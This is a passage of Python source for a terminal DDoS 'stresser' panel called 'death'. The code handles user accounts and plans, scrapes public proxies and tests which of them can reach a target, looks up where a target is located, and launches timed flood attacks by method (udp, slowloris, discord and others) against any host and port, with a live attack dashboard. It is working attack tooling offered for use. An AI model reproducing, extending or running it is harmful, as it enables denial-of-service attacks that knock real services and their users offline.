                       fail_counts, fail_lock, dead_proxies, dead_lock, True))

    start = time.time()
    while not stop.is_set():
        elapsed = time.time() - start
        remaining = max(0, duration - int(elapsed))
        if S.attack_screen is not None:
            S.attack_screen["remaining"] = remaining
            S.attack_screen["sent"] = stats["sent"]
            S.attack_screen["failed"] = stats["failed"]
            S.attack_screen["responded"] = stats.get("responded", 0)
            S.attack_screen["pool_size"] = len(pool)
            S.attack_screen["dead"] = len(dead_proxies)
        if remaining <= 0:
            break
        time.sleep(0.2)
    stop.set()
    for t in threads:
        try:
            t.join(timeout=1)
        except Exception:
            pass
    S.total_sent += stats["sent"]
    S.total_failed += stats["failed"]
    S.total_responded += stats.get("responded", 0)
    S.attacks_run += 1
    if dead_proxies:
        for p in list(dead_proxies):
            S.proxies.pop(p, None)
        save_proxies(S.username, S.proxies)
        S.log_line(f"attack done — removed {len(dead_proxies)} dead proxies")
    time.sleep(0.6)

def render_banner(frame):
    theme = S.theme
    cols, _ = term_size()
    lines = BANNER_DEATH.split("\n")
    bw = max(len(l) for l in lines)
    pad = max(0, (cols - bw) // 2)
    out = ["\n"]
    for line in lines:
        out.append(" " * pad + gradient_sweep(line, frame, theme) + "\n")
    return "".join(out)

def render_prompt(frame):
    theme = S.theme
    _, rows = term_size()
    blink = (frame // 8) % 2 == 0
    cursor = solid("█", theme, "accent") if blink else " "
    user = solid(S.username or "guest", theme, "accent")
    sep = solid("●", theme, "accent")
    brand = solid("death", theme, "accent")
    arrow = solid("►", theme, "accent")
    return move(rows, 1) + clear_line() + f"{user}{sep}{brand}{arrow} {S.input_buffer}{cursor}"

def render_attack_screen(frame):
    theme = S.theme
    cols, _ = term_size()
    a = S.attack_screen
    if a is None:
        return ""
    out = [HOME, CLEAR]
    header = "D E A T H   |   A T T A C K I N G"
    out.append("\n")
    out.append(center_visible(gradient_sweep(header, frame, theme), cols) + "\n\n")
    emblem_lines = emblem_animated(frame, theme)
    emblem_w = max(len(l) for l in EMBLEM.split("\n"))
    gap = 2
    mid = []
    mid.append(solid("[Attack Info]", theme, "accent"))
    mid.append("Method : " + solid(str(a["method"]), theme, "accent"))
    mid.append("Target : " + solid(str(a["target"]), theme, "accent"))
    mid.append("Port   : " + solid(str(a["port"]), theme, "accent"))
    mid.append("Time   : " + solid(str(a["remaining"]) + "s", theme, "accent"))
    mid.append("")
    mid.append(solid("[Traffic]", theme, "accent"))
    mid.append("Sent   : " + solid(str(a.get("sent", 0)), theme, "accent"))
    mid.append("Replies: " + solid(str(a.get("responded", 0)), theme, "accent"))
    mid.append("Failed : " + solid(str(a.get("failed", 0)), theme, "accent"))
    mid.append("Pool   : " + solid(str(a.get("pool_size", 0)), theme, "accent"))
    mid.append("Dead   : " + solid(str(a.get("dead", 0)), theme, "accent"))
    mid.append("")
    mid.append(solid("[Target Info]", theme, "accent"))
    mid.append("IP      : " + solid(str(a["info"]["ip"]), theme, "accent"))
    mid.append("ASN     : " + solid(str(a["info"]["asn"]), theme, "accent"))
    mid.append("ISP     : " + solid(str(a["info"]["isp"]), theme, "accent"))
    mid.append("City    : " + solid(str(a["info"]["city"]), theme, "accent"))
    mid.append("State   : " + solid(str(a["info"]["state"]), theme, "accent"))
    mid.append("Country : " + solid(str(a["info"]["country"]), theme, "accent"))
    mid_w = max(visible_len(x) for x in mid)
    left_pad = 6
    max_rows = max(len(emblem_lines), len(mid))
    for i in range(max_rows):
        left = emblem_lines[i] if i < len(emblem_lines) else " " * emblem_w
        right = emblem_lines[i] if i < len(emblem_lines) else " " * emblem_w
        center = mid[i] if i < len(mid) else ""
        center_pad = " " * max(0, mid_w - visible_len(center))
        out.append(" " * left_pad + left + " " * gap + center + center_pad + " " * gap + right + "\n")
    return "".join(out)

def render_home(frame):
    theme = S.theme
    out = []
    emblem_lines = emblem_animated(frame, theme)
    emblem_w = max(len(l) for l in EMBLEM.split("\n"))
    method_lines = []
    for section, items in METHODS:
        method_lines.append(solid(f"[{section}]", theme, "accent"))
        for name, desc in items:
            method_lines.append("  " + solid(name.ljust(8), theme, "accent") + " - " + solid(desc, theme, "dim"))
        method_lines.append("")
    out.append("\n")
    max_rows = max(len(emblem_lines), len(method_lines))
    for i in range(max_rows):
        left = emblem_lines[i] if i < len(emblem_lines) else " " * emblem_w
        right = method_lines[i] if i < len(method_lines) else ""
        out.append("    " + left + "    " + right + "\n")
    return "".join(out)

def render_commands(frame):
    theme = S.theme
    out = ["\n", "  " + solid("commands", theme, "accent") + "\n",
           "  " + solid("-" * 50, theme, "dim") + "\n"]
    for name, desc in COMMANDS:
        out.append("  " + solid(name.ljust(14), theme, "accent") + " " + solid(desc, theme, "dim") + "\n")
    out.append("\n")
    return "".join(out)

def render_methods(frame):
    theme = S.theme
    out = ["\n"]
    for section, items in METHODS:
        out.append("  " + solid(f"[{section}]", theme, "accent") + "\n")
        for name, desc in items:
            out.append("    " + solid(name.ljust(10), theme, "accent") + " - " + solid(desc, theme, "dim") + "\n")
            info = METHOD_INFO.get(name)
            if info:
                out.append("      " + solid(info, theme, "dim") + "\n")
        out.append("\n")
    return "".join(out)

def render_log(frame):
    theme = S.theme
    out = ["\n", "  " + solid("session log", theme, "accent") + "\n",
           "  " + solid("-" * 60, theme, "dim") + "\n"]
    with S.log_lock:
        recent = list(S.log[-22:])
    for line in recent:
        out.append("  " + line + "\n")
    out.append("\n")
    return "".join(out)

def render_body(frame):
    if S.current_view == "home":
        return render_home(frame)
    if S.current_view == "commands":
        return render_commands(frame)
    if S.current_view == "methods":
        return render_methods(frame)
    if S.current_view == "log":
        return render_log(frame)
    return render_home(frame)

def cmd_help(_): S.current_view = "commands"
def cmd_clear(_): S.log_line("screen cleared"); S.current_view = "home"
def cmd_exit(_): S.running = False
def cmd_home(_): S.current_view = "home"
def cmd_methods(_): S.current_view = "methods"

def cmd_themes(_):
    S.current_view = "log"
    S.log_line("themes: " + ", ".join(sorted(THEMES.keys())))

def cmd_theme(args):
    S.current_view = "log"
    if not args:
        S.log_line(f"usage: theme <name>  (current: {S.theme_name})"); return
    name = args[0].lower()
    if name in THEMES:
        S.theme_name = name; S.log_line(f"theme set -> {name}")
    else:
        S.log_line(f"unknown theme: {name}")

def cmd_online(_):
    S.current_view = "log"
    users = [S.username] + S.online_users
    S.log_line("online: " + ", ".join(sorted(set(users))))

def cmd_passwd(args):
    S.current_view = "log"
    if not args: S.log_line("usage: passwd <new>"); return
    if S.is_admin: S.log_line("admin password cannot be changed"); return
    S.users[S.username] = args[0]; save_users(S.users); S.log_line("password updated")

def cmd_plan(_):
    S.current_view = "log"
    role = "admin" if S.is_admin else "user"
    S.log_line(f"account: {S.username}  ({role})")
    S.log_line(f"proxies loaded: {len(S.proxies)}")
    S.log_line("plan: elite")

def cmd_queue(_):
    S.current_view = "log"
    if not S.queue: S.log_line("queue empty"); return
    for q in S.queue: S.log_line(f"  {q['target']}  {q['method']}  {q['duration']}s")

def cmd_scheduled(_):
    S.current_view = "log"
    if not S.scheduled: S.log_line("no scheduled attacks"); return
    for a in S.scheduled: S.log_line(f"  {a['when']}  {a['target']}  {a['method']}")

def cmd_ongoing(_):
    S.current_view = "log"
    if not S.attacks: S.log_line("no running attacks"); return
    for a in S.attacks: S.log_line(f"  {a['target']}  {a['method']}  {a['elapsed']}s  {a['pps']} pps")

def cmd_addusr(args):
    S.current_view = "log"
    if not S.is_admin: S.log_line("permission denied"); return
    if len(args) < 2: S.log_line("usage: addusr <username> <password>"); return
    name, pw = args[0], args[1]
    if name == "admin": S.log_line("cannot override admin"); return
    if name in S.users: S.log_line(f"user exists: {name}"); return
    S.users[name] = pw; save_users(S.users); S.log_line(f"account created: {name}")

def cmd_delusr(args):
    S.current_view = "log"
    if not S.is_admin: S.log_line("permission denied"); return
    if not args: S.log_line("usage: delusr <username>"); return
    name = args[0]
    if name == "admin": S.log_line("cannot delete admin"); return
    if name not in S.users: S.log_line(f"no such user: {name}"); return
    del S.users[name]; save_users(S.users); S.log_line(f"account deleted: {name}")

def cmd_users(_):
    S.current_view = "log"
    if not S.is_admin: S.log_line("permission denied"); return
    S.log_line("admin (root)")
    for u in S.users: S.log_line(f"  {u}")

def cmd_scrape(_):
    S.current_view = "log"
    if S.scraping:
        S.log_line("scrape already running — press S to stop & save"); return
    S.scraping = True
    S.scrape_stop.clear()

    def runner():
        try:
            def on_progress(msg): S.log_line(msg)
            result = scrape_and_validate(on_progress, S.scrape_stop)
            for p, meta in result.items(): S.proxies[p] = meta
            save_proxies(S.username, S.proxies)
            S.log_line(f"saved {len(result)} proxies -> {proxy_file(S.username)}")
            S.log_line(f"total pool for {S.username}: {len(S.proxies)}")
        except Exception as e:
            S.log_line(f"scrape error: {e}")
        finally:
            S.scraping = False; S.scrape_stop.clear()
    threading.Thread(target=runner, daemon=True).start()

def cmd_validate(args):
    S.current_view = "log"
    if len(args) < 2: S.log_line("usage: validate <host> <port>"); return
    host = args[0]
    try: port = int(args[1])
    except ValueError: S.log_line("port must be an integer"); return
    if not S.proxies: S.log_line("no proxies loaded — run 'scrape' first"); return
    S.log_line(f"preflight: testing {len(S.proxies)} proxies against {host}:{port}")

    def runner():
        try:
            survivors = []; done = 0; total = len(S.proxies)
            with ThreadPoolExecutor(max_workers=300) as ex:
                futures = {ex.submit(proxy_can_reach_target, p, host, port): p for p in list(S.proxies.keys())}
                for fut in as_completed(futures):
                    done += 1
                    try:
                        if fut.result(): survivors.append(futures[fut])
                    except Exception: pass
                    if done % 100 == 0: S.log_line(f"  preflight {done}/{total} — alive: {len(survivors)}")
            removed = 0
            for p in list(S.proxies.keys()):
                if p not in survivors: S.proxies.pop(p, None); removed += 1
            save_proxies(S.username, S.proxies)
            S.log_line(f"preflight done — {len(survivors)} usable, removed {removed}")
        except Exception as e:
            S.log_line(f"validate error: {e}")
    threading.Thread(target=runner, daemon=True).start()

def cmd_proxies(_):
    S.current_view = "log"
    if not S.proxies: S.log_line("no proxies loaded — run 'scrape'"); return
    S.log_line(f"pool: {len(S.proxies)} proxies  ({proxy_file(S.username)})")
    for p in list(S.proxies.keys())[:15]: S.log_line(f"  {p}")
    if len(S.proxies) > 15: S.log_line(f"  ... +{len(S.proxies) - 15} more")

def cmd_clearproxies(_):
    S.current_view = "log"
    S.proxies = {}; save_proxies(S.username, {}); S.log_line("proxy pool wiped")

def cmd_status(_):
    S.current_view = "log"
    up = int(time.time() - S.session_start)
    S.log_line(f"session uptime: {up}s")
    S.log_line(f"proxies loaded: {len(S.proxies)}")
    S.log_line(f"scraping: {S.scraping}")
    S.log_line(f"attack running: {S.attack_screen is not None}")
    S.log_line(f"attacks this session: {S.attacks_run}")
    S.log_line(f"total sent: {S.total_sent}")
    S.log_line(f"total failed: {S.total_failed}")

def cmd_stop(_):
    S.current_view = "log"
    if S.attack_screen is None: S.log_line("no attack running"); return
    S.attack_stop.set(); S.log_line("stopping attack...")

def cmd_stats(_):
    S.current_view = "log"
    S.log_line(f"sent: {S.total_sent}")
    S.log_line(f"failed: {S.total_failed}")
    S.log_line(f"attacks: {S.attacks_run}")

def cmd_whoami(_):
    S.current_view = "log"
    role = "admin" if S.is_admin else "user"
    S.log_line(f"{S.username} ({role})")

def cmd_time(_):
    S.current_view = "log"
    S.log_line(time.strftime("%Y-%m-%d %H:%M:%S"))

def cmd_ascii(args):
    S.current_view = "log"
    if not args: S.log_line("usage: ascii <banner|emblem|skull>"); return
    name = args[0].lower()
    if name == "banner":
        for line in BANNER_DEATH.split("\n"): S.log_line(line)
    elif name == "emblem":
        for line in EMBLEM.split("\n"): S.log_line(line)
    elif name == "skull":
        for line in SKULL_SMALL.split("\n"): S.log_line(line)
    else:
        S.log_line(f"unknown asset: {name}")

COMMAND_TABLE: Dict[str, Callable] = {
    "clear": cmd_clear, "exit": cmd_exit, "help": cmd_help, "home": cmd_home,
    "methods": cmd_methods, "ongoing": cmd_ongoing, "online": cmd_online,
    "passwd": cmd_passwd, "plan": cmd_plan, "queue": cmd_queue,
    "scheduled": cmd_scheduled, "theme": cmd_theme, "themes": cmd_themes,
    "addusr": cmd_addusr, "delusr": cmd_delusr, "users": cmd_users,
    "scrape": cmd_scrape, "validate": cmd_validate, "proxies": cmd_proxies,
    "clearproxies": cmd_clearproxies, "status": cmd_status, "stop": cmd_stop,
    "stats": cmd_stats, "whoami": cmd_whoami, "time": cmd_time, "ascii": cmd_ascii,
}

def launch_attack(method, host, port, duration, extra):
    local_methods = ("udp", "pps", "hold", "discord", "slowloris")
    if not S.proxies and method not in local_methods:
        S.current_view = "log"
        S.log_line("no proxies loaded — run 'scrape' first")
        return
    info = lookup_target(host)
    S.attack_stop.clear()
    S.attack_screen = {
        "method": method, "target": host, "port": port,
        "duration": duration, "remaining": duration, "info": info, "extra": extra,
        "sent": 0, "failed": 0, "responded": 0,
        "pool_size": len(S.proxies), "dead": 0, "started": time.time(),
    }
    S.attack_frame = 0
    S.attack_thread = threading.Thread(target=attack_worker, args=(method, host, port, duration), daemon=True)
    S.attack_thread.start()

def dispatch(line):
    line = line.strip()
    if not line: return
    S.log_line(f"{S.username}●death► {line}")
    parts = line.split()
    cmd, args = parts[0].lower(), parts[1:]
    method_names = {m[0] for _, items in METHODS for m in items}
    if cmd in method_names:
        if len(args) < 3:
            S.current_view = "log"; S.log_line(f"usage: {cmd} <host> <port> <time>"); return
        host = args[0]
        try:
            port = int(args[1]); duration = int(args[2])
        except ValueError:
            S.current_view = "log"; S.log_line("port and time must be integers"); return
        launch_attack(cmd, host, port, duration, args[3:])
        return
    handler = COMMAND_TABLE.get(cmd)
    if handler is None:
        S.current_view = "log"; S.log_line(f"unknown command: {cmd}  (try 'help')"); return
    handler(args)

_key_queue = queue.Queue()

def _stdin_reader():
    while True:
        try:
            ch = sys.stdin.read(1)
            if not ch:
                time.sleep(0.05); continue
            _key_queue.put(ch)
        except Exception:
            time.sleep(0.1)

_reader_thread = threading.Thread(target=_stdin_reader, daemon=True)
_reader_thread.start()

def read_key():
    try:
        return _key_queue.get_nowait()
    except queue.Empty:
        return None

def handle_key(ch):
    if ch is None: return
    if ch in ("S", "s") and S.scraping and not S.input_buffer:
        S.scrape_stop.set(); S.log_line("S pressed — stopping scrape, saving what we have..."); return
    if ch == "\x03": S.running = False; return
    if ch in ("\r", "\n"):
        line = S.input_buffer; S.input_buffer = ""; dispatch(line); return
    if ch in ("\x7f", "\b"): S.input_buffer = S.input_buffer[:-1]; return
    if ch == "\x1b": return
    if ch.isprintable(): S.input_buffer += ch

def login_screen():
    theme = S.theme
    sys.stdout.write(CLEAR)
    sys.stdout.write(render_banner(0))
    sys.stdout.write("\n\n")
    cols, _ = term_size()

    def center(text): return center_visible(text, cols)

    sys.stdout.write(center(solid("login", theme, "accent")) + "\n\n")
    sys.stdout.write(center(solid("username: ", theme, "dim")))
    sys.stdout.flush()

    username = ""
    while True:
        ch = read_key()
        if ch is None:
            time.sleep(0.02); continue
        if ch == "\x03": return False
        if ch in ("\r", "\n"): break
        if ch in ("\x7f", "\b"): username = username[:-1]
        elif ch.isprintable(): username += ch
        sys.stdout.write("\r" + " " * cols + "\r")
        sys.stdout.write(center(solid("username: ", theme, "dim") + solid(username, theme, "accent")))
        sys.stdout.flush()

    sys.stdout.write("\n" + center(solid("password: ", theme, "dim")))
    sys.stdout.flush()
    password = ""
    while True:
        ch = read_key()
        if ch is None:
            time.sleep(0.02); continue
        if ch == "\x03": return False
        if ch in ("\r", "\n"): break
        if ch in ("\x7f", "\b"): password = password[:-1]
        elif ch.isprintable(): password += ch
        masked = "•" * len(password)
        sys.stdout.write("\r" + " " * cols + "\r")
        sys.stdout.write(center(solid("password: ", theme, "dim") + solid(masked, theme, "accent")))
        sys.stdout.flush()

    ok, is_admin = verify_user(username, password)
    if ok:
        S.username = username; S.is_admin = is_admin; return True
    sys.stdout.write("\n\n" + center(solid("access denied", theme, "accent")) + "\n")
    sys.stdout.flush()
    time.sleep(1.5)
    return login_screen()

def main():
    if not login_screen(): return
    S.proxies = load_proxies(S.username)
    sys.stdout.write(HIDE_CURSOR + CLEAR)
    sys.stdout.flush()
    last_size = term_size()
    try:
        while S.running:
            ch = read_key()
            while ch is not None:
                handle_key(ch); ch = read_key()
            cur_size = term_size()
            if cur_size != last_size:
                sys.stdout.write(CLEAR); sys.stdout.flush()
                last_size = cur_size
            if S.attack_screen is not None:
                sys.stdout.write(render_attack_screen(S.attack_frame))
                sys.stdout.flush()
                if S.attack_screen.get("remaining", 0) <= 0 and (
                    S.attack_thread is None or not S.attack_thread.is_alive()
                ):
                    S.attack_screen = None; S.current_view = "home"; continue
                S.attack_frame += 1
                time.sleep(1 / 24)
                continue
            frame = S.frame
            sys.stdout.write(HOME + CLEAR + render_banner(frame) + render_body(frame) + render_prompt(frame))
            sys.stdout.flush()
            S.frame += 1
            time.sleep(1 / 30)
    except KeyboardInterrupt:
        pass
    finally:
        S.attack_stop.set(); S.scrape_stop.set()
        sys.stdout.write(SHOW_CURSOR + RESET + CLEAR + HOME); sys.stdout.flush()

if __name__ == "__main__":
    main()
